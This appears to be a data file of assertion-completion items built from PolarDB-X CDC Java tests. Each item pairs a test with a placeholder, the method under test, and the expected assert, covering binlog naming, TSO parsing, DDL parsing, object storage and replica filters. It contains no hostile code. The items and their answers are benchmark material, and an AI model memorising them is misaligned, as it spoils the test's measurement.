"should_back_to_1_when_reach_max() { // 单流测试 String groupName = GROUP_NAME_GLOBAL; String streamName = STREAM_NAME_GLOBAL; String fileName = getFirstBinlogFileName(groupName, streamName); for (int i = 1; i < BINLOG_FILE_NAME_MAX_SEQUENCE; i++) { fileName = getNextBinlogFileName(fileName); } ""<AssertPlaceHolder>""; }
getNextBinlogFileName(String fileName) { Pair<String, Integer> pair = splitBinlogFileName(fileName); int currentSequence = pair.getRight(); if (currentSequence == BINLOG_FILE_NAME_MAX_SEQUENCE) { log.warn(""binlog file seq has reached to max, will start from 1""); currentSequence = 0; } String newSuffix = String.format(BINLOG_FILE_NAME_SUFFIX_FORMAT, ++currentSequence); return pair.getLeft() + BINLOG_FILE_NAME_SEPARATOR + newSuffix; }"	assertEquals(getFirstBinlogFileName(groupName, streamName), getNextBinlogFileName(fileName))
"testGetActualTso() { String actualTso = getActualTso(""700984129973806700815409065152909189120000000000000000""); System.out.println(actualTso); Assert.""<AssertPlaceHolder>""; }
getActualTso(String tso) { return tso.substring(0, 38); }"	"assertEquals(""70098412997380670081540906515290918912"", actualTso)"
"testGetTsoTimestamp() { long tsoTimestamp = getTsoTimestamp(""683872748963535353613697927051770675200000000000282415""); Assert.""<AssertPlaceHolder>""; }
getTsoTimestamp(String tso) { return Long.valueOf(tso.substring(0, 19)); }"	assertEquals(6838727489635353536L, tsoTimestamp)
"testGetCurrentStackTrace() { String stackTrace = getCurrentStackTrace(); Scanner scanner = new Scanner(stackTrace); int count = 0; while (scanner.hasNextLine()) { count++; String line = scanner.nextLine(); if (count == 2) { Assert.""<AssertPlaceHolder>""; } } }
getCurrentStackTrace() { StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace(); StringBuilder buf = new StringBuilder(); for (StackTraceElement item : stackTrace) { buf.append(item.toString()); buf.append(""\n""); } return buf.toString(); }"	"assertTrue( StringUtils.startsWith(line, ""com.aliyun.polardbx.binlog.util.CommonUtils.getCurrentStackTrace""))"
"testDDLDropTable() { String ddl = ""drop table aaa_A;""; SQLDropTableStatement statement = (SQLDropTableStatement) parseSQLStatement(ddl); for (SQLExprTableSource expr : statement.getTableSources()) { Assert.""<AssertPlaceHolder>""; } }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""aaa_A"", expr.getTableName())"
"testDDLCreateTable() { String ddl = ""create table test_abcdefgAAA(id int primary key auto_increment, name varchar(20))""; SQLCreateTableStatement statement = (SQLCreateTableStatement) parseSQLStatement(ddl); Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""test_abcdefgAAA"", statement.getTableName())"
"testDDLCreateDatabase() { String ddl = ""create database test_DDD""; SQLCreateDatabaseStatement statement = (SQLCreateDatabaseStatement) parseSQLStatement(ddl); Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""test_DDD"", statement.getDatabaseName())"
"testChinese() { String sql = ""CREATE INDEX 检查时间 ON yyk_pacs_patient (examine_time,hid,examine_type)""; SQLStatement statement = parseSQLStatement(sql); SQLCreateIndexStatement createIndexStatement = (SQLCreateIndexStatement) statement; Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""检查时间"", createIndexStatement.getName().getSimpleName())"
"testReWriteWrongSql() { String ddl = ""alter table `payment_voucher` drop key `out_voucher_id`,drop key pay_no\n"" + ""add index key `uid_pay_no`(`user_id`,`pay_no`) using btree\n"" + ""add unique key `uid_voucherid_source`(`user_id`,`out_voucher_id`,`source`) using btree"";  String expect = ""alter table `payment_voucher` drop key `out_voucher_id`,drop key pay_no \n"" + ""add index `uid_pay_no`(`user_id`,`pay_no`) using btree \n"" + ""add unique key `uid_voucherid_source`(`user_id`,`out_voucher_id`,`source`) using btree""; String newDdl = SQLUtils.reWriteWrongDdl(ddl); Assert.""<AssertPlaceHolder>""; }
reWriteWrongDdl(String sql) { Scanner scanner = new Scanner(sql); StringBuilder sb = new StringBuilder(); int keyCount = 0; boolean reWrite = false; while (scanner.hasNext()) { String line = scanner.nextLine(); Scanner lineScanner = new Scanner(line); while (lineScanner.hasNext()) { String key = lineScanner.next(); String lowerKey = key.toLowerCase(); if (StringUtils.equalsAny(lowerKey, ""key"", ""index"")) { keyCount++; if (keyCount > 1) { reWrite = true; continue; } } else { keyCount = 0; } sb.append(key).append("" ""); } sb.append(""\n""); } if (reWrite) { return sb.toString().trim(); } return null; }"	assertEquals(expect, newDdl)
"testTruncateSubPartition() { String sql = ""alter table t_key_key_template_1694514577176 truncate subpartition p1sp1""; SQLStatement stmt = SQLUtils.parseSQLStatement(sql); String expectSql = ""ALTER TABLE t_key_key_template_1694514577176\n"" + ""\tTRUNCATE SUBPARTITION p1sp1""; Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	assertEquals(expectSql, stmt.toString())
"testAlterTableAddTablesWithForce() { String sql = ""ALTER TABLEGROUP mytg2 ADD TABLES tb1, tb2, tb_add_3, tb_add_4, tb_add_5 force""; SQLStatement stmt = SQLUtils.parseSQLStatement(sql); String expectSql = ""ALTER TABLEGROUP mytg2 ADD TABLES tb1, tb2, tb_add_3, tb_add_4, tb_add_5 FORCE ""; Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	assertEquals(expectSql, stmt.toString())
"testMergeTableGroup() { String sql = "" MERGE TABLEGROUPS mytg2v INTO mytg1qItM FORCE""; SQLStatement statement = parseSQLStatement(sql); Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""MERGE TABLEGROUPS mytg2v INTO mytg1qItM FORCE"", statement.toString())"
"testAlterTableModifyColumn() { String sql = ""ALTER TABLE t_modify\n"" + ""  MODIFY COLUMN b bigint WITH TABLEGROUP=tg1591 IMPLICIT""; SQLStatement statement = parseSQLStatement(sql); Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""ALTER TABLE t_modify\n"" + ""\tMODIFY COLUMN b bigint WITH TABLEGROUP=tg1591 IMPLICIT"", statement.toString())"
"testAlterIndexVisible() { String sql = ""ALTER TABLE `t_order_0`  ALTER INDEX `cci_0` VISIBLE""; SQLAlterTableStatement statement = parseSQLStatement(sql); statement.getItems().removeIf(i -> i instanceof MySqlAlterTableAlterFullTextIndex); Assert.""<AssertPlaceHolder>""; }
parseSQLStatement(String sql) { try { SQLStatementParser parser = SQLParserUtils.createSQLStatementParser(sql, DbType.mysql, SQL_FEATURES); List<SQLStatement> statementList = parser.parseStatementList(); try { if (DynamicApplicationConfig.getBoolean(ConfigKeys.IS_LAB_ENV)) { checkDbType(statementList); } } catch (Throwable t) { // ignore exception }  if (statementList.isEmpty()) { return null; } else { return (T) statementList.get(0); } } catch (Throwable t) { log.error(""parse sql statement error! {}"", sql, t); throw t; } }"	"assertEquals(""ALTER TABLE `t_order_0`"", statement.toString())"
"testGetConfig() { String value = TestConfig.getConfig(TestTestConfig.class, ""sample""); Assert.""<AssertPlaceHolder>""; }
getConfig(Class<?> clazz, String key) { String path = clazz.getClassLoader().getResource(""."").getPath() + ""test_config.properties""; return loadingCache.getUnchecked(path).getProperty(key); }"	"assertEquals(value, ""sample"")"
"tesSortByFreeResourceDesc() { List<Container> list = new ArrayList<>(); list.add(Container.builder().capability(Resource.builder().memory_mb(100).build()).build()); list.add(Container.builder().capability(Resource.builder().memory_mb(200).build()).build()); list.add(Container.builder().capability(Resource.builder().memory_mb(100).build()).build()); list.add(Container.builder().capability(Resource.builder().memory_mb(300).build()).build()); list.add(Container.builder().capability(Resource.builder().memory_mb(50).build()).build());  new BinlogXTopologyBuilder("""").sortByFreeResourceDesc(list); List<Integer> sortedList = list.stream() .map(Container::getCapability) .map(Resource::getFreeMemMb) .collect(Collectors.toList()); Assert.""<AssertPlaceHolder>""; }
sortByFreeResourceDesc(List<Container> containerList) { containerList.sort((o1, o2) -> { int free1 = o1.getCapability().getFreeMemMb(); int free2 = o2.getCapability().getFreeMemMb(); if (free1 == free2) { return 0; } else if (free1 < free2) { return 1; } else { return -1; } }); }"	assertEquals(Lists.newArrayList(210, 140, 70, 70, 35), sortedList)
"testGetVersion() { try (final MockedStatic<ColumnarVersions> columnarVersionsMocked = mockStatic(ColumnarVersions.class)) { columnarVersionsMocked.when(ColumnarVersions::getVersionsByHttp).thenReturn(""{\n"" + ""  ""polardbx_columnar_image_version"": ""5.4.19-20240320_17109018-5322410_20240321_7c453d3c-cloud-normal"",\n"" + ""  ""polardbx_columnar_rpm_version"": ""t-polardbx-columnar-5.4.19-20240320_17109018.noarch.rpm"",\n"" + ""  ""polardbx_columnar_daemon_version"": ""t-polardbx-cdc-5.4.19-20240319_17108478.noarch.rpm"",\n"" + ""  ""polardbx_columnar_fw_branch_name"": ""master"",\n"" + ""  ""polardbx_version"": ""5.4.19"",\n"" + ""  ""polardbx_sql_version"": ""5.4.19-SNAPSHOT"",\n"" + ""  ""polardbx_cdc_client_version"": ""2.0.32""\n"" + ""}"");  final ColumnarSystemResource columnarSystemResource = new ColumnarSystemResource(); final String version = columnarSystemResource.getVersion(); MatcherAssert.""<AssertPlaceHolder>""; } }
getVersion() { return ColumnarVersions.getVersionsByHttp(); }"	"assertThat(version, CoreMatchers.containsString(""5.4.19-20240320_17109018""))"
"Exception { String fileName = ""binlog.000001""; if (lindormClient.doesObjectExist(bucketName, fileName)) { lindormClient.deleteObject(bucketName, fileName); } String content = ""Nearly all men can stand adversity, "" + ""but if you want to test a man's character, give him power.""; ByteBuffer buffer = ByteBuffer.wrap(content.getBytes()); CRC64 crc64 = new CRC64(); crc64.update(content.getBytes(), content.length()); lindormClient.putFile(bucketName, fileName, buffer, crc64.getValue()); ObjectMetadata metadata = lindormClient.getObjectMetadata(bucketName, fileName); Assert.""<AssertPlaceHolder>""; }
getObjectMetadata(String bucketName, String fileName) { log.info(""get object meta data of file: {}, in bucket: {}"", fileName, bucketName); return s3Client.getObjectMetadata(bucketName, fileName); }"	assertEquals(metadata.getContentLength(), content.length())
"listBucketTest() { List<String> buckets = manager.listBuckets(); boolean expectTrue = buckets.contains(manager.getBucket()); Assert.""<AssertPlaceHolder>""; }
getBucket() { return lindormConfig.getBucket(); }"	assertTrue(expectTrue)
"IOException { String fileName = ""download-test1.txt""; String expectContent = ""hello, world""; String destFile = ""download-test1.txt""; manager.delete(fileName); Appender appender = manager.providerAppender(fileName); appender.begin(); appender.append(expectContent.getBytes(), expectContent.getBytes().length); appender.end(); manager.download(fileName, "".""); String actualContent = new String(Files.readAllBytes(Paths.get(destFile))); Assert.""<AssertPlaceHolder>""; new File(destFile).deleteOnExit(); }
download(String fileName, String localPath) { boolean success = true; do { try (LindormClient client = getLindormClient()) { String lindormFileName = getLindormFileName(fileName); logger.info(""begin to download lindorm file: {} to local path: {}"", lindormFileName, localPath); S3Object object = client.getObject(getBucket(), lindormFileName); FileOutputStream fos = new FileOutputStream(new File(localPath, fileName)); S3ObjectInputStream input = object.getObjectContent(); IOUtils.copy(input, fos); } catch (Exception e) { success = false; logger.error(""download file {} error, will try again!"", fileName, e); try { Thread.sleep(1000); } catch (InterruptedException interruptedException) { logger.error(""interruption during sleep"", interruptedException); break; } } } while (!success); logger.info(""success to download file {} to local"", fileName); }"	assertEquals(expectContent, actualContent)
"getObjectDataTest() { String fileName = ""get-obj-data-test.txt""; manager.delete(fileName); Appender putAppender = manager.providerAppender(fileName); byte[] content = new byte[1024]; new Random().nextBytes(content); CRC64 expectCrc64 = new CRC64(); expectCrc64.update(content, content.length); putAppender.begin(); putAppender.append(content, content.length); putAppender.end(); byte[] actualData = manager.getObjectData(fileName); CRC64 actualCrc64 = new CRC64(); actualCrc64.update(actualData, actualData.length); Assert.""<AssertPlaceHolder>""; }
getObjectData(String fileName) { try (LindormClient client = getLindormClient()) { String lindormFileName = getLindormFileName(fileName); ByteArrayOutputStream baos = new ByteArrayOutputStream(); S3Object object = client.getObject(getBucket(), lindormFileName); try (S3ObjectInputStream input = object.getObjectContent()) { IOUtils.copy(input, baos); } return baos.toByteArray(); } catch (IOException e) { logger.error(""get object data of {} error"", fileName, e); return null; } }"	assertEquals(expectCrc64.getValue(), actualCrc64.getValue())
"getStrictModeTest1() { int sqlMode = 4194304; String sqlModeString = SqlModeUtil.convertSqlMode(sqlMode); Assert.""<AssertPlaceHolder>""; }
convertSqlMode(long sqlMode) { String modeString = SQL_MODE_MAPPING_CACHE.get(sqlMode); if (null != modeString) { return modeString; } StringBuilder sb = new StringBuilder(); SQL_MODE_MAP.forEach((key, value) -> { if ((sqlMode & key) > 0) { sb.append(value); sb.append(','); } }); if (sb.length() != 0) { sb.setLength(sb.length() - 1); } String mode = sb.toString(); SQL_MODE_MAPPING_CACHE.put(sqlMode, mode); return mode; }"	"assertEquals(""STRICT_ALL_TABLES"", sqlModeString)"
"getStrictModeTest2() { int sqlMode = 1075838976; String sqlModeString = SqlModeUtil.convertSqlMode(sqlMode); Assert.""<AssertPlaceHolder>""; }
convertSqlMode(long sqlMode) { String modeString = SQL_MODE_MAPPING_CACHE.get(sqlMode); if (null != modeString) { return modeString; } StringBuilder sb = new StringBuilder(); SQL_MODE_MAP.forEach((key, value) -> { if ((sqlMode & key) > 0) { sb.append(value); sb.append(','); } }); if (sb.length() != 0) { sb.setLength(sb.length() - 1); } String mode = sb.toString(); SQL_MODE_MAPPING_CACHE.put(sqlMode, mode); return mode; }"	"assertEquals(""NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES"", sqlModeString)"
"getOriginalSql() { String sql = ""# POLARX_ORIGIN_SQL=CREATE DATABASE BalancerTestBase MODE 'auto'\n"" + ""# POLARX_TSO=699138551269084371215224507282353070080000000000000000\n"" + ""CREATE DATABASE BalancerTestBase CHARACTER SET utf8mb4""; String originSql = DdlApplyHelper.getOriginSql(sql); Assert.""<AssertPlaceHolder>""; }
getOriginSql(String sql) { String originSql = extractPolarxOriginSql(sql); if (StringUtils.isBlank(originSql)) { return """"; }  SQLStatement statement = parseSQLStatement(originSql); if (!(statement instanceof SQLCreateTableStatement)) { return originSql; }  // remove _drds_implicit_id_ SQLCreateTableStatement createTable = (SQLCreateTableStatement) statement; Iterator<SQLTableElement> iter = createTable.getTableElementList().iterator(); while (iter.hasNext()) { SQLTableElement cur = iter.next(); if (cur instanceof SQLColumnDefinition) { SQLColumnDefinition column = (SQLColumnDefinition) cur; if (StringUtils.equalsIgnoreCase(column.getColumnName(), RplConstants.POLARX_IMPLICIT_ID) || StringUtils.equalsIgnoreCase(column.getColumnName(), RplConstants.RDS_IMPLICIT_ID)) { iter.remove(); } }  // remove rds/_drds_implicit_id_ primary key if (cur instanceof MySqlPrimaryKey) { MySqlPrimaryKey pk = (MySqlPrimaryKey) cur; String columnName = pk.getColumns().get(0).getExpr().toString(); if (StringUtils.equalsIgnoreCase(columnName, RplConstants.POLARX_IMPLICIT_ID) || StringUtils.equalsIgnoreCase(columnName, RplConstants.RDS_IMPLICIT_ID)) { iter.remove(); } } }  return createTable.toString(); }"	"assertEquals(""CREATE DATABASE BalancerTestBase MODE 'auto'"", originSql)"
"getDdlSqlContext() { String sql = ""# POLARX_ORIGIN_SQL=CREATE DATABASE BalancerTestBase MODE 'auto'\n"" + ""# POLARX_TSO=699138551269084371215224507282353070080000000000000000\n"" + ""CREATE DATABASE BalancerTestBase CHARACTER SET utf8mb4""; DefaultQueryLog queryLog = new DefaultQueryLog("""", sql, new Timestamp(12345), 0, 0); SqlContext context = DdlApplyHelper.getDdlSqlContext(queryLog, UUID.randomUUID().toString(), ""699138551269084371215224507282353070080000000000000000""); Assert.""<AssertPlaceHolder>""; }
getDdlSqlContext(DefaultQueryLog queryLog, String token, String tso) {  SqlContext sqlContext = new SqlContext(queryLog.getQuery(), """", """", new ArrayList<>(), SqlModeUtil.convertSqlMode(queryLog.getSqlMode())); sqlContext.setDdlParallelSeq(queryLog.getParallelSeq()); String originSql = DdlApplyHelper.getOriginSql(queryLog.getQuery()); String sql = StringUtils.isNotBlank(originSql) ? originSql : queryLog.getQuery(); sql = removeSomeHints(sql);  // process for async ddl String asyncSql = tryAttachAsyncDdlHints(sql, queryLog.getExecTime()); if (!StringUtils.equals(sql, asyncSql)) { LogUtil.getAsyncDdlLogger().info(""[async mode ddl], tso: {}, token: {}, execTime:{} , sql: {}"", tso, token, queryLog.getExecTime(), sql);  sql = asyncSql; sqlContext.setAsyncDdl(true); }  // process for columnar index DdlResult result = DruidDdlParser.parse(sql, queryLog.getSchema()); if (!getBoolean(RPL_DDL_APPLY_COLUMNAR_ENABLED) && result != null && result.getSqlStatement() != null) { // TODO 增加判断逻辑：目标实例是否开通了columnar Pair<Boolean, Boolean> pair = tryRemoveColumnarIndex(result.getSqlStatement(), queryLog.getTableMeta()); if (pair.getKey()) { if (pair.getValue()) { log.info(""ddl sql contains columnar index and reformatted, before: {}, after: {}."", sql, result.getSqlStatement().toString()); sql = result.getSqlStatement().toString(); } else { log.info(""ddl sql contains columnar index and will be ignored, sql: {}"", sql); return null; } } }  // 如果sql头部含有 /* //1/ */，则把token comment放到sql的尾部，否则/* //1/ */对应的影子表机制不会生效 String comment = String.format(DDL_TOKEN_COMMENT, token); if (StringUtils.startsWith(sql, ""/* //1/ */"")) { sqlContext.setSql(sql + comment); } else { sqlContext.setSql(comment + sql); } sqlContext.setDdlEventSchema(queryLog.getSchema());  // use actual schemaName return processDdlSql(sqlContext, queryLog.getSchema(), result); }"	"assertTrue(StringUtils.endsWithIgnoreCase(context.getSql(), ""create database if not exists BalancerTestBase MODE 'auto'""))"
"getCreateUser() { String sql = ""# POLARX_ORIGIN_SQL=CREATE USER if not exists 'jiyue1'@'%' IDENTIFIED BY '123456'\n"" + ""# POLARX_TSO=699138551269084371215224507282353070080000000000000000\n"" + ""CREATE USER 'jiyue1'@'%' IDENTIFIED BY '123456'""; DefaultQueryLog queryLog = new DefaultQueryLog("""", sql, new Timestamp(12345), 0, 0); SqlContext context = DdlApplyHelper.getDdlSqlContext(queryLog, UUID.randomUUID().toString(), ""699138551269084371215224507282353070080000000000000000""); Assert.""<AssertPlaceHolder>""; }
getDdlSqlContext(DefaultQueryLog queryLog, String token, String tso) {  SqlContext sqlContext = new SqlContext(queryLog.getQuery(), """", """", new ArrayList<>(), SqlModeUtil.convertSqlMode(queryLog.getSqlMode())); sqlContext.setDdlParallelSeq(queryLog.getParallelSeq()); String originSql = DdlApplyHelper.getOriginSql(queryLog.getQuery()); String sql = StringUtils.isNotBlank(originSql) ? originSql : queryLog.getQuery(); sql = removeSomeHints(sql);  // process for async ddl String asyncSql = tryAttachAsyncDdlHints(sql, queryLog.getExecTime()); if (!StringUtils.equals(sql, asyncSql)) { LogUtil.getAsyncDdlLogger().info(""[async mode ddl], tso: {}, token: {}, execTime:{} , sql: {}"", tso, token, queryLog.getExecTime(), sql);  sql = asyncSql; sqlContext.setAsyncDdl(true); }  // process for columnar index DdlResult result = DruidDdlParser.parse(sql, queryLog.getSchema()); if (!getBoolean(RPL_DDL_APPLY_COLUMNAR_ENABLED) && result != null && result.getSqlStatement() != null) { // TODO 增加判断逻辑：目标实例是否开通了columnar Pair<Boolean, Boolean> pair = tryRemoveColumnarIndex(result.getSqlStatement(), queryLog.getTableMeta()); if (pair.getKey()) { if (pair.getValue()) { log.info(""ddl sql contains columnar index and reformatted, before: {}, after: {}."", sql, result.getSqlStatement().toString()); sql = result.getSqlStatement().toString(); } else { log.info(""ddl sql contains columnar index and will be ignored, sql: {}"", sql); return null; } } }  // 如果sql头部含有 /* //1/ */，则把token comment放到sql的尾部，否则/* //1/ */对应的影子表机制不会生效 String comment = String.format(DDL_TOKEN_COMMENT, token); if (StringUtils.startsWith(sql, ""/* //1/ */"")) { sqlContext.setSql(sql + comment); } else { sqlContext.setSql(comment + sql); } sqlContext.setDdlEventSchema(queryLog.getSchema());  // use actual schemaName return processDdlSql(sqlContext, queryLog.getSchema(), result); }"	"assertTrue(StringUtils.endsWithIgnoreCase(context.getSql(), ""CREATE USER if not exists 'jiyue1'@'%' IDENTIFIED BY '123456'""))"
"getTso_1() { String sql = ""# POLARX_ORIGIN_SQL=ALTER TABLE `cdc_datatype`.`numeric` DROP COLUMN _NUMERIC_\n"" + ""# POLARX_TSO=699124861471450732815223138302086389760000000000000000\n"" + ""ALTER TABLE `cdc_datatype`.`numeric`\n"" + ""  DROP COLUMN _NUMERIC_""; String tso = DdlApplyHelper.getTso(sql, new Timestamp(1666843560), ""binlog.000004:0000021718#1769892875.1666843560""); Assert.""<AssertPlaceHolder>""; }
getTso(String sql, Timestamp timestamp, String pos) { Scanner scanner = new Scanner(sql); while (scanner.hasNextLine()) { Matcher matcher = TSO_PATTERN.matcher(scanner.nextLine()); if (matcher.find()) { return matcher.group(1); } } return String.valueOf(sql.hashCode()) + timestamp.hashCode() + pos.hashCode(); }"	"assertEquals(tso, ""699124861471450732815223138302086389760000000000000000"")"
"getTso_2() { String sql = ""/*POLARX_ORIGIN_SQL=CREATE TABLE aaaaaa (\n"" + ""    id int,\n"" + ""    value int,\n"" + ""    INDEX `auto_shard_key_id` USING BTREE(`ID`),\n"" + ""    _drds_implicit_id_ bigint AUTO_INCREMENT,\n"" + ""    PRIMARY KEY (_drds_implicit_id_)\n"" + "")\n"" + ""DBPARTITION BY hash(id)\n"" + ""TBPARTITION BY hash(id) TBPARTITIONS 2*/ "" + ""CREATE TABLE aaaaaa ( id int, value "" + ""int, INDEX `auto_shard_key_id` USING BTREE(`ID`) ) DEFAULT CHARACTER SET = utf8mb4 DEFAULT COLLATE = "" + ""utf8mb4_general_ci""; String tso = DdlApplyHelper.getTso(sql, new Timestamp(1618802638), """"); Assert.""<AssertPlaceHolder>""; }
getTso(String sql, Timestamp timestamp, String pos) { Scanner scanner = new Scanner(sql); while (scanner.hasNextLine()) { Matcher matcher = TSO_PATTERN.matcher(scanner.nextLine()); if (matcher.find()) { return matcher.group(1); } } return String.valueOf(sql.hashCode()) + timestamp.hashCode() + pos.hashCode(); }"	"assertEquals(""-35199207716188026380"", tso)"
"testHostSafeCheck2() { boolean exception = false; try { CommonUtil.hostSafeCheck(""acbdabdasdhkj.com==""); } catch (Exception e) { exception = true; } ""<AssertPlaceHolder>""; }
hostSafeCheck(String host) { String regex = ""^[a-zA-Z0-9_\\-.:\\[\\]]+$"";  Pattern pattern = Pattern.compile(regex); Matcher matcher = pattern.matcher(host);  if (!matcher.matches()) { throw new PolardbxException(String.format(""invalid host name : %s"", host)); } }"	assertTrue(exception)
"Throwable { String schema = ""polardbx_meta_db""; String tbName = ""rpl_task""; DataSource dataSource = getGmsDataSource(); TableInfo tableInfo = DbMetaManager.getTableInfo(dataSource, schema, tbName, HostType.RDS, false); Assert.""<AssertPlaceHolder>""; }
getTableInfo(DataSource dataSource, String schema, String tbName, HostType hostType, boolean needUkAndGsi) throws SQLException { TableInfo tableInfo = new TableInfo(schema, tbName); List<ColumnInfo> columns = getTableColumnInfos(dataSource, schema, tbName); List<String> pks = getTablePks(dataSource, schema, tbName); tableInfo.setColumns(columns); tableInfo.setPks(pks); if (needUkAndGsi) { List<String> uks = getTableUks(dataSource, schema, tbName); tableInfo.setUks(uks); if (isLabEnv && hostType == HostType.POLARX2) { for (ColumnInfo column : columns) { if (column.isGenerated() && uks.contains(column.getName())) { tableInfo.setHasGeneratedUk(true); break; } } tableInfo.setGsiNum(getGsiNum(dataSource, schema, tbName)); } }  if (hostType == HostType.POLARX1 || hostType == HostType.POLARX2) { List<String> shardKeys = getTableShardKeys(dataSource, tbName); if (!shardKeys.isEmpty()) { tableInfo.setDbShardKey(shardKeys.get(0)); } if (shardKeys.size() > 1) { tableInfo.setTbShardKey(shardKeys.get(1)); } } return tableInfo; }"	assertNotNull(tableInfo)
"hit_DoTable_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""full_src_1, rpl""); replicaMeta.setIgnoreDb(""full_src_1, rpl""); replicaMeta.setDoTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setWildIgnoreTable(""d%.tb\\_charset%, d%.col\\_charset%""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta); // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""full_src_1""); rowChange.setTable(""t1""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
"miss_DoTable_Miss_IgnoreTable_Keep() { ReplicaMeta replicaMeta = new ReplicaMeta(); replicaMeta.setDoDb(""""); replicaMeta.setIgnoreDb(""""); replicaMeta.setDoTable(""""); replicaMeta.setIgnoreTable(""full_src_1.t1, full_src_1.t2""); replicaMeta.setWildDoTable(""""); replicaMeta.setWildIgnoreTable(""""); replicaMeta.setRewriteDb(""""); printChangeFilterSql(replicaMeta);  // init ReplicaFilter filter = new ReplicaFilter(replicaMeta); filter.init();  DefaultRowChange rowChange = new DefaultRowChange(); rowChange.setAction(DBMSAction.INSERT);  rowChange.setSchema(""dutf8""); rowChange.setTable(""tb_charset_gbk""); Assert.""<AssertPlaceHolder>""; }
ignoreEvent(DefaultRowChange rowChange) { return ignoreEvent(getRewriteDb(rowChange.getSchema(), DBMSAction.INSERT), rowChange.getTable(), rowChange.getAction(), Integer.MIN_VALUE); }"	assertFalse(filter.ignoreEvent(rowChange))
